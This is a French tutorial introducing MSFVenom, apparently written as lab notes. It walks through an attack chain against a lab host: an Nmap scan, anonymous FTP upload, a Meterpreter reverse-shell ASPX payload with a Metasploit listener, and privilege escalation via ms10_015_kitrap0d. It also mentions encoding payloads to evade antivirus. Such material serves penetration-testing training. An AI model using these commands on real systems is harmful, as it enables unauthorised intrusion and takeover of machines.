# Introduction à MSFVenom

MSFVenom est un outil intégré à Metasploit qui résulte de la fusion des anciens outils **MSFPayload** et **MSFEncode**. Il permet de générer des charges utiles (**payloads**) et de les encoder pour faciliter leur exécution, notamment pour contourner les mécanismes de détection (antivirus, IDS/IPS).

* **Avant MSFVenom** : Il fallait d'abord générer un **shellcode** avec MSFPayload, puis l'encoder avec MSFEncode.
* **Aujourd’hui** : MSFVenom combine ces deux étapes, permettant de créer des payloads plus facilement pour différentes architectures et systèmes d’exploitation tout en offrant des options d'encodage.

***

#### <mark style="color:green;">Création de Payloads</mark>

**Exemple de scénario :** Supposons qu'on trouve un serveur FTP avec un accès anonyme (ou avec de faibles identifiants) et qu’il soit lié à un service web accessible via HTTP.

<mark style="color:orange;">**Scan de la cible**</mark>

L’objectif est d’identifier les ports ouverts et services vulnérables sur la machine cible avec **Nmap**.

```
nmap -sV -T4 -p- 10.10.10.5

```

<mark style="color:orange;">**Accès FTP**</mark>

Une fois que l'accès FTP est établi, il est possible de lister les fichiers disponibles<mark style="color:orange;">.</mark>

```
ftp 10.10.10.5
ls
```

Si un répertoire comme **aspnet\_client** est présent, on peut en déduire qu'on peut y téléverser des **.aspx** shells.

<mark style="color:orange;">**Génération du Payload**</mark>

On utilise MSFVenom pour générer une charge utile **Meterpreter reverse TCP** pour un serveur Windows, en spécifiant le format **ASPX**.

{% code fullWidth="true" %}
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```
{% endcode %}

<mark style="color:orange;">**Exécution du Payload**</mark>

Une fois le fichier reverse\_shell.aspx généré, on doit démarrer un listener dans Metasploit pour écouter la connexion reverse. Configurer Multi/Handler

Dans Metasploit, on utilise le module multi/handler pour écouter les connexions&#x20;

```
msfconsole -q
use multi/handler
set LHOST 10.10.14.5
set LPORT 1337
run

```

<mark style="color:orange;">**Lancer le Payload**</mark>

On accède au fichier **reverse\_shell.aspx** via le navigateur et le payload se déclenche, permettant une session **Meterpreter** sur la cible.

```
http://10.10.10.5/reverse_shell.aspx

```

#### <mark style="color:orange;">**Escalade de Privilèges**</mark>

Le module **Local Exploit Suggester** de Metasploit peut être utilisé pour suggérer des exploits locaux qui permettent d’obtenir des privilèges plus élevés sur la machine cible.

```
search local exploit suggester
use 2376
set session 2
run

```

Le système propose plusieurs vulnérabilités exploitables, comme **ms10\_015\_kitrap0d**, qu'on peut tester pour obtenir des privilèges administratifs.

<mark style="color:orange;">**Exploitation locale**</mark>

Une fois qu'un exploit local est sélectionné, on peut l'exécuter pour escalader les privilèges.

```
use exploit/windows/local/ms10_015_kitrap0d
set LPORT 1338
set SESSION 3
run

```
